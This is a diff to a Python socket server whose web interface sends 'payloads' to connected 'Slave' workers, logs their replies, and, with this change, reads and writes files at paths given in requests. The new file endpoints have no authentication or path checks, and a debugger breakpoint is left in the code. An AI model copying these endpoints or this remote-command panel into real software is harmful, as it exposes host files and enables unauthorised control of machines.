@@ -56,7 +56,7 @@ def _worker_process(worker_connection, client=None):
     process_connection, process_client_addr = process_socket.accept()
     while True:
         try:
-            cluster_fs_data = process_connection.recv(1024).decode('utf-8')
+            cluster_fs_data = process_connection.recv(config.MAX_TRANSMIT_BYTES).decode('utf-8')
             # with open('test', 'a') as f:
             #     f.write(f'{cluster_fs_data}\n')
             # print(cluster_fs_data)
@@ -101,7 +101,7 @@ while True:
 
         connections = [conn for conn in connections if utilities._check_conn(conn)]
 
-        data = connection.recv(1024).decode('utf-8')
+        data = connection.recv(config.MAX_TRANSMIT_BYTES).decode('utf-8')
         # slave connected
         if data.startswith('Slave'):
             connections.append(conn)
@@ -111,13 +111,14 @@ while True:
             # payload URLs: POST /b64<payload>?b64<host:port>
             # add payload input field
             print(f'Web interface Request data: << GET /index.html')
+
+            files = utilities.traverse_directory(config.CLUSTER_FS_DIR_NAME)
+
             template = templateEnv.get_template('index.html')
-            response = template.render(connections=connections)
+            response = template.render(connections=connections, directory=config.CLUSTER_FS_DIR_NAME, files=files)
+            
             connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
             connection.send(response.encode('utf-8'))
-            connection.close()
-        elif data.startswith('GET /favicon'):
-            connection.sendall(b'HTTP/1.1 404 Not Found\r\n\r\n')
             connection.close()
         elif data.startswith('GET /worker_'):
             try:
@@ -158,19 +159,68 @@ while True:
             # render payload result
             try:
                 worker_connection['conn'].settimeout(config.COMMAND_TIMEOUT)
-                response_data = worker_connection['conn'].recv(1024).decode('utf-8')
+                response_data = worker_connection['conn'].recv(config.MAX_TRANSMIT_BYTES).decode('utf-8')
             except socket.timeout:
                 response_data = ''
                 worker_connection['conn'].settimeout(None)
-            worker_connection['history'].append(f'>>> {payload}<br/><<< {response_data}')
+            worker_connection['history'].append(f'>>> {payload}\n<<< {response_data}')
             print(f'Slave {host} reply: << {response_data}')
             template = templateEnv.get_template('worker.html')
             response = template.render(connections=connections, conn=worker_connection, response=response_data, history=worker_connection['history'])
             connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
             connection.send(response.encode('utf-8'))
             connection.close()
+        elif data.startswith('GET /file_'):
+            # TODO: read from cluster FS JSON //.DS_Store.json
+            file_url = base64.b64decode(data.split()[1][6:]).decode('utf-8')
+            # TODO: read from cluster FS JSON //.DS_Store.json
+            response = open(file_url).read()
+
+            connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
+            connection.send(response.encode('utf-8'))
+            connection.close()
+        elif data.startswith('GET /directory_'):
+            # TODO: read from cluster FS JSON //.DS_Store.json
+            directory = base64.b64decode(data.split()[1][11:]).decode('utf-8')
+
+            files = utilities.traverse_directory(directory)
+
+            template = templateEnv.get_template('index.html')
+            response = template.render(connections=connections, directory=directory, files=files)
+
+            connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
+            connection.send(response.encode('utf-8'))
+            connection.close()
+        elif data.startswith('POST /new_file'):
+            import pdb; pdb.set_trace()
+            file_path, file_content = data.split()[-1].split('&')
+            file_path = unquote_plus(file_path.split('path=')[1])
+            file_content = unquote_plus(file_content.split('content=')[1])
+            try:
+                with open(file_path, 'w') as _file:
+                    _file.write(file_content)
+            except Exception as e:
+                template = templateEnv.get_template('error.html')
+                traceback = f'Exception: {e}, Line number: {e.__traceback__.tb_lineno}'
+                response = template.render(traceback=traceback)
+                connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
+                connection.send(response.encode('utf-8'))
+                connection.close()
+            files = utilities.traverse_directory(config.CLUSTER_FS_DIR_NAME)
+
+            template = templateEnv.get_template('index.html')
+            response = template.render(connections=connections, directory=config.CLUSTER_FS_DIR_NAME, files=files)
+            
+            connection.sendall(b'HTTP/1.1 201 CREATED\r\n\r\n')
+            connection.send(response.encode('utf-8'))
+            connection.close()
+        elif data.startswith('GET /favicon'):
+            connection.sendall(b'HTTP/1.1 404 Not Found\r\n\r\n')
+            connection.close()
         elif data.startswith('GET'):
             print(f'Request data: << {data}')
+            connection.sendall(b'HTTP/1.1 404 Not Found\r\n\r\n')
+            connection.close()
             # _worker_process(connection)
         elif not data: #break  # else?
             pass
@@ -178,7 +228,7 @@ while True:
             print(f'{client_addr}: << {data}')
         # print(data)
 
-        # data = connection.recv(1024).decode('utf-8')
+        # data = connection.recv(config.MAX_TRANSMIT_BYTES).decode('utf-8')
 
 
         # connections = [conn for conn in connections if _check_conn(conn)]
